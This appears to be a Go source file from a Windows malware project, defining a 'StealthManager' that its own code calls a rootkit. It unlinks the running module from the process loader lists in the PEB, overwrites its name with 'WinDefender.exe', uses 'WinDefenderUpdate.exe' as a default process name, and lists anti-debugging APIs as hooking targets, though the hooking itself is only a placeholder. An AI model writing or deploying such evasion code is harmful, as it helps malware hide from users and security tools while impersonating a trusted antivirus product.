package handlers

import (
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

type StealthManager struct {
	mu              sync.RWMutex
	hidden          bool
	originalEntries []*listEntry
	hooks           map[string]uintptr
	processName     string
	pebHidden       bool
	apiHooked       bool
	namesSpoofed    bool
}

type processBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

type peb struct {
	InheritedAddressSpace    byte
	ReadImageFileExecOptions byte
	BeingDebugged            byte
	BitField                 byte
	Mutant                   uintptr
	ImageBaseAddress         uintptr
	Ldr                      uintptr
	ProcessParameters        uintptr
	SubSystemData            uintptr
	ProcessHeap              uintptr
	FastPebLock              uintptr
	AtlThunkSListPtr         uintptr
	IFEOKey                  uintptr
	CrossProcessFlags        uint32
	_                        [4]byte
	KernelCallbackTable      uintptr
	SystemReserved           uint32
	AtlThunkSListPtr32       uint32
	ApiSetMap                uintptr
}

type pebLdrData struct {
	Length                          uint32
	Initialized                     byte
	SsHandle                        uintptr
	InLoadOrderModuleList           listEntry
	InMemoryOrderModuleList         listEntry
	InInitializationOrderModuleList listEntry
	EntryInProgress                 uintptr
	ShutdownInProgress              byte
	ShutdownThreadId                uintptr
}

type listEntry struct {
	Flink *listEntry
	Blink *listEntry
}

type ldrDataTableEntry struct {
	InLoadOrderLinks           listEntry
	InMemoryOrderLinks         listEntry
	InInitializationOrderLinks listEntry
	DllBase                    uintptr
	EntryPoint                 uintptr
	SizeOfImage                uint32
	FullDllName                unicodeString
	BaseDllName                unicodeString
	Flags                      uint32
	LoadCount                  uint16
	TlsIndex                   uint16
	HashLinks                  listEntry
	TimeDateStamp              uint32
}

type unicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

var (
	stealthNtdllCache    *windows.LazyDLL
	stealthKernel32Cache *windows.LazyDLL
	stealthOnce          sync.Once
)

func NewStealthManager() *StealthManager {
	return &StealthManager{
		hooks:       make(map[string]uintptr),
		processName: "WinDefenderUpdate.exe", // mmh
	}
}

func initStealthDLLs() {
	stealthNtdllCache = windows.NewLazySystemDLL("ntdll.dll")
	stealthKernel32Cache = windows.NewLazySystemDLL("kernel32.dll")
}

// activateRootkit is the legacy method that activates all stealth features
func (sm *StealthManager) ActivateRootkit() bool {
	return sm.ActivateAllMethods()
}

func (sm *StealthManager) ActivateAllMethods() bool {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if sm.hidden {
		return true
	}

	stealthOnce.Do(initStealthDLLs)

	success := true

	if !sm.pebHidden {
		if sm.hideFromPEBAdvanced() {
			sm.pebHidden = true
		} else {
			success = false
		}
	}

	if !sm.apiHooked {
		if sm.hookCriticalAPIs() { //mmmh, its placeholder for the actual API hooking logic
			sm.apiHooked = true
		} else {
			success = false
		}
	}

	if !sm.namesSpoofed {
		if sm.spoofProcessName() {
			sm.namesSpoofed = true
		} else {
			success = false
		}
	}

	if success || sm.pebHidden || sm.apiHooked || sm.namesSpoofed {
		sm.hidden = true
		return true
	}

	return false
}

// activatePEBHiding activates only PEB hiding
func (sm *StealthManager) ActivatePEBHiding() bool {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if sm.pebHidden {
		return true
	}

	stealthOnce.Do(initStealthDLLs)

	if sm.hideFromPEBAdvanced() {
		sm.pebHidden = true
		sm.updateHiddenStatus()
		return true
	}

	return false
}

// activateAPIHooking activates only API hooking
func (sm *StealthManager) ActivateAPIHooking() bool {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if sm.apiHooked {
		return true
	}

	stealthOnce.Do(initStealthDLLs)

	if sm.hookCriticalAPIs() {
		sm.apiHooked = true
		sm.updateHiddenStatus()
		return true
	}

	return false
}

// activateNameSpoofing activates only name spoofing
func (sm *StealthManager) ActivateNameSpoofing() bool {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	if sm.namesSpoofed {
		return true
	}

	stealthOnce.Do(initStealthDLLs)

	if sm.spoofProcessName() {
		sm.namesSpoofed = true
		sm.updateHiddenStatus()
		return true
	}

	return false
}

func (sm *StealthManager) updateHiddenStatus() {
	sm.hidden = sm.pebHidden || sm.apiHooked || sm.namesSpoofed
}

func (sm *StealthManager) hideFromPEBAdvanced() bool {
	var pbi processBasicInformation
	procNtQuery := stealthNtdllCache.NewProc("NtQueryInformationProcess")

	ret, _, _ := procNtQuery.Call(
		uintptr(windows.CurrentProcess()),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)

	if ret != 0 {
		return false
	}

	pebPtr := (*peb)(unsafe.Pointer(pbi.PebBaseAddress))
	if pebPtr == nil || pebPtr.Ldr == 0 {
		return false
	}

	ldr := (*pebLdrData)(unsafe.Pointer(pebPtr.Ldr))
	if ldr == nil {
		return false
	}

	currentModule := sm.findCurrentModule(&ldr.InLoadOrderModuleList)
	if currentModule == nil {
		return false
	}

	// store original entries for restoration
	sm.originalEntries = append(sm.originalEntries,
		&currentModule.InLoadOrderLinks,
		&currentModule.InMemoryOrderLinks,
		&currentModule.InInitializationOrderLinks,
	)

	// unlink from all lists
	sm.unlinkEntryAdvanced(&currentModule.InLoadOrderLinks)
	sm.unlinkEntryAdvanced(&currentModule.InMemoryOrderLinks)
	sm.unlinkEntryAdvanced(&currentModule.InInitializationOrderLinks)

	// spoof module name
	if currentModule.BaseDllName.Buffer != nil {
		sm.spoofModuleName(&currentModule.BaseDllName)
	}

	return true
}

func (sm *StealthManager) findCurrentModule(head *listEntry) *ldrDataTableEntry {
	if head == nil {
		return nil
	}

	imageBase := sm.getImageBase()
	if imageBase == 0 {
		return nil
	}

	for entry := head.Flink; entry != head && entry != nil; entry = entry.Flink {
		if !sm.isValidPointer(unsafe.Pointer(entry)) {
			break
		}

		module := (*ldrDataTableEntry)(unsafe.Pointer(uintptr(unsafe.Pointer(entry)) -
			unsafe.Offsetof(ldrDataTableEntry{}.InLoadOrderLinks)))

		if !sm.isValidPointer(unsafe.Pointer(module)) {
			continue
		}

		if module.DllBase == imageBase {
			return module
		}
	}
	return nil
}

func (sm *StealthManager) getImageBase() uintptr {
	var pbi processBasicInformation
	procNtQuery := stealthNtdllCache.NewProc("NtQueryInformationProcess")

	ret, _, _ := procNtQuery.Call(
		uintptr(windows.CurrentProcess()),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)

	if ret != 0 {
		return 0
	}

	pebPtr := (*peb)(unsafe.Pointer(pbi.PebBaseAddress))
	if pebPtr == nil {
		return 0
	}

	return pebPtr.ImageBaseAddress
}

func (sm *StealthManager) unlinkEntryAdvanced(le *listEntry) {
	if le == nil || le.Flink == nil || le.Blink == nil {
		return
	}

	if !sm.isValidPointer(unsafe.Pointer(le.Flink)) ||
		!sm.isValidPointer(unsafe.Pointer(le.Blink)) {
		return
	}

	le.Flink.Blink = le.Blink
	le.Blink.Flink = le.Flink

	le.Flink = nil
	le.Blink = nil
}

func (sm *StealthManager) isValidPointer(ptr unsafe.Pointer) bool {
	if ptr == nil {
		return false
	}

	address := uintptr(ptr)
	return address > 0x10000 && address < 0x7FFFFFFF0000
}

func (sm *StealthManager) spoofProcessName() bool {
	var pbi processBasicInformation
	procNtQuery := stealthNtdllCache.NewProc("NtQueryInformationProcess")

	ret, _, _ := procNtQuery.Call(
		uintptr(windows.CurrentProcess()),
		0,
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		0,
	)

	if ret != 0 {
		return false
	}

	pebPtr := (*peb)(unsafe.Pointer(pbi.PebBaseAddress))
	if pebPtr == nil {
		return false
	}

	if pebPtr.ProcessParameters != 0 {
		sm.cleanProcessReferences(pebPtr)
	}

	return true
}

func (sm *StealthManager) cleanProcessReferences(peb *peb) {
}

func (sm *StealthManager) spoofModuleName(name *unicodeString) {
	if name == nil || name.Buffer == nil {
		return
	}

	stealthName := []uint16{'W', 'i', 'n', 'D', 'e', 'f', 'e', 'n', 'd', 'e', 'r', '.', 'e', 'x', 'e', 0}

	maxLen := int(name.MaximumLength / 2)
	copyLen := len(stealthName)
	if copyLen > maxLen {
		copyLen = maxLen
	}

	for i := 0; i < copyLen && i < len(stealthName); i++ {
		if !sm.isValidPointer(unsafe.Pointer(uintptr(unsafe.Pointer(name.Buffer)) + uintptr(i*2))) {
			break
		}
		*(*uint16)(unsafe.Pointer(uintptr(unsafe.Pointer(name.Buffer)) +
			uintptr(i*2))) = stealthName[i]
	}

	name.Length = uint16(copyLen * 2)
}

func (sm *StealthManager) hookCriticalAPIs() bool {
	criticalAPIs := map[string]map[string]bool{
		"ntdll.dll": {
			"NtQueryInformationProcess": true,
			"NtQuerySystemInformation":  true,
			"NtSetInformationThread":    true,
		},
		"kernel32.dll": {
			"IsDebuggerPresent":          true,
			"CheckRemoteDebuggerPresent": true,
			"GetTickCount":               true,
			"OutputDebugStringA":         true,
		},
	}

	successCount := 0
	totalAPIs := 0

	for dllName, apis := range criticalAPIs {
		for apiName := range apis {
			totalAPIs++
			if sm.hookAPI(dllName, apiName) {
				successCount++
			}
		}
	}

	return successCount > 0 && successCount >= totalAPIs/2
}

func (sm *StealthManager) hookAPI(dllName, apiName string) bool {
	var dll *windows.LazyDLL
	if dllName == "ntdll.dll" {
		dll = stealthNtdllCache
	} else {
		dll = stealthKernel32Cache
	}

	if dll == nil {
		return false
	}

	proc := dll.NewProc(apiName)
	if proc == nil {
		return false
	}

	addr := proc.Addr()
	if addr == 0 {
		return false
	}

	sm.hooks[dllName+":"+apiName] = addr
	return true
}

func (sm *StealthManager) GetStatus() (bool, map[string]bool) {
	sm.mu.RLock()
	defer sm.mu.RUnlock()

	status := map[string]bool{
		"hidden":        sm.hidden,
		"peb_hidden":    sm.pebHidden,
		"api_hooked":    sm.apiHooked,
		"names_spoofed": sm.namesSpoofed,
	}

	return sm.hidden, status
}

func (sm *StealthManager) GetActiveHooks() int {
	sm.mu.RLock()
	defer sm.mu.RUnlock()
	return len(sm.hooks)
}

func (sm *StealthManager) RestoreOriginalState() bool {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	sm.hidden = false
	sm.pebHidden = false
	sm.apiHooked = false
	sm.namesSpoofed = false
	sm.hooks = make(map[string]uintptr)
	sm.originalEntries = nil

	return true
}
